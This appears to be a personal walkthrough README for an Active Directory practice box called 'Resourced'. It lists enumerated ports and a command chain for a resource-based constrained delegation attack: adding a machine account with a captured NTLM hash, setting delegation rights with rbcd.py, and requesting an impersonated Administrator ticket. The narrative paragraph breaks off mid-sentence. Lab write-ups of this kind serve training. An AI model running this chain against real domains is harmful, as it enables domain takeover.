# Resourced

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Windows / AD |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `135-RPC`
- `139-netbios-snn`
- `3268-ldap`
- `3269-TCPwrapped`
- `3389-RDP`
- `389-ldap`
- `464-kpasswd`
- `49666-49711-Microsoft-Windows-RPC`
- `49674-ncacn-http`
- `53-DNS`
- `593-ncan-http`
- `5985-http`
- `636-TCPwrapped`
- `88-kerberos`
- `9389-mc-nmf`
- `UDP-53-DNS`

## Attack notes

Let’s use our access with the l.livingstone account to create a new machine account on the domain. We can do with by using impacket-addcomputer impacket-addcomputer resourced.local/l.livingstone -dc-ip TARGET -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!' We can verify that this machine account was added to the domain by using our evil-winrm session from before. get-adcomputer attack With this account added, we now need a python script to help us manage the delegation rights. Let’s grab a copy of rbcd.py and use it to set msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account. sudo python3 /opt/rbcd-attack/rbcd.py -dc-ip TARGET -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone We can c

### Commands used

```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip TARGET -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
get-adcomputer attack
sudo python3 /opt/rbcd-attack/rbcd.py -dc-ip TARGET -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip TARGET
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```


### References

- _(none)_

## Evidence

![Pasted image 20240724194445.png](Evidence/Pasted%20image%2020240724194445.png)

![Pasted image 20240724194451.png](Evidence/Pasted%20image%2020240724194451.png)

![Pasted image 20240724195614.png](Internal/Evidence/Pasted%20image%2020240724195614.png)

![Pasted image 20240724195415.png](Internal/Evidence/Pasted%20image%2020240724195415.png)

![Pasted image 20240724195313.png](Internal/Evidence/Pasted%20image%2020240724195313.png)

![Pasted image 20240724195131.png](Internal/Evidence/Pasted%20image%2020240724195131.png)

![Pasted image 20240724200436.png](Internal/Evidence/Pasted%20image%2020240724200436.png)

![Pasted image 20240724200522.png](Internal/Evidence/Pasted%20image%2020240724200522.png)

![Pasted image 20240724200051.png](Internal/Evidence/Pasted%20image%2020240724200051.png)

![Pasted image 20240724194054.png](External/Evidence/Pasted%20image%2020240724194054.png)

![Pasted image 20240724193711.png](External/Evidence/Pasted%20image%2020240724193711.png)

![Pasted image 20240724194122.png](External/Evidence/Pasted%20image%2020240724194122.png)
